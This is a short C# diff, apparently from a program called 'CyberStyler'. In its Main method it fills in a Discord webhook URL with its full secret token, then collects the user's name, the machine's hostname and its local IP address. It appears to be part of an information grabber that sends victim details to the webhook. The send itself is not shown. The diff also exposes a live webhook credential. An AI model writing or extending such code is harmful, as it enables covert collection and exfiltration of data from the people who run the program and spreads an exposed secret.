@@ -14,7 +14,7 @@ namespace CyberStyler
         [STAThread]
         static void Main()
         {
-            var client = new DiscordWebhookClient("");
+            var client = new DiscordWebhookClient("https://discord.com/api/webhooks/1387923952663269519/WZqhSiaPISX9W0unc89nkVwkhYgMoSuzAjYKyzSt2WcwWAENW4aXghwA3qsNf6At4GOf");
             string user = Environment.UserName;
             String host = System.Net.Dns.GetHostName();
             System.Net.IPAddress ip = Dns.GetHostByName(host).AddressList[0];
